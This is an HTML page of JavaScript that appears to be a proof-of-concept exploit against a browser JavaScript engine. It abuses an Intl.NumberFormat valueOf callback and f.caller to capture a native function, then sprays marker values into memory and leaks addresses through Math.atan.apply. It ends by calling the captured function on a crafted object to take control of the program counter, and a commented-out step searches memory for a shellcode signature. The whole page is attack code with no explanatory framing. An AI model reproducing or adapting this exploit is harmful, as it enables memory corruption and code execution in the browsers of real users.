<html>

<textarea id="alltext" rows="50" cols="40">
*** DUMP MESSAGE HERE ***

</textarea>
<script>
function appendMessage(msg) {
    var msg_with_line = msg + '\n';
    document.getElementById("alltext").value += msg_with_line;
}

// define mdprint here
mdprint = appendMessage;

//
function describe(obj) {
    mdprint('[Not Implemented] describe function');
}

//
function dumpObj(obj) {
    Math.atan.apply(obj);
}

//
function findOffsetByBytes(data, signature) {
    function findOffset(data, signature) {
        for (let i = 0; i < data.length - signature.length; i++) {
            let found = true;
            for (let j = 0; j < signature.length && found; j++) {
                if (data[i + j] != signature[j]) found = false;
            }
            if (found) return i;
        }
        throw 'findOffset() could not find: ' + signature;
    }
    return '0x' + findOffset(data, signature).toString(16);
}

function searchShellcodeSigByBytes(base, data, signature) {
    return Add(base, new Int64(findOffsetByBytes(data, signature)));
}
</script>

<script src="utils.js"></script>
<script src="int64.js"></script>

<script>
var inf = new Intl.NumberFormat();
var take_rip;
function f(){
    take_rip = f.caller;
    return 10;
}
inf.format({valueOf : f});

mdprint('get native function...');
mdprint(take_rip);

// prepare memory to control pc
var controlled_memory= [];
for (let i = 0; i < 0x100; i += 8) controlled_memory.push(new Int64('0x4141424251515252').asDouble());

var signature = new Int64('0xba0dc0deba0dc0de');
controlled_memory[0] = signature.asDouble();

// // search signature in memory
// var hardcode_addr = 0x0;
// mdprint('read content from hardcode address ...');
// var sc_memory_area = readBytes(hardcode_addr, 0xffff);
// mdprint('match signature byte by byte...');
// var shellcode_addr = searchShellcodeSigByBytes(leaked_sc_heap_addr, sc_memory_area, sig_shellcode.bytes());

// leak controlled memory address
dumpObj(controlled_memory);


var obj = {
    'a': 0x10,
    'b': 0x18,
    'c': 0x20,
    'd': 0x28,
    'e': 0x30,
    'f': 0x38,
    'g': 0x40,
    'h': 0x48,
    //'i': 0x50
    'i': new Int64('0x4141414142424242').asDouble()
};

var symbol = Symbol.for("AAAAAAAA");
Math.atan.apply(symbol);

mdprint("trigger vul...");
take_rip.call(obj);

</script>
</html>
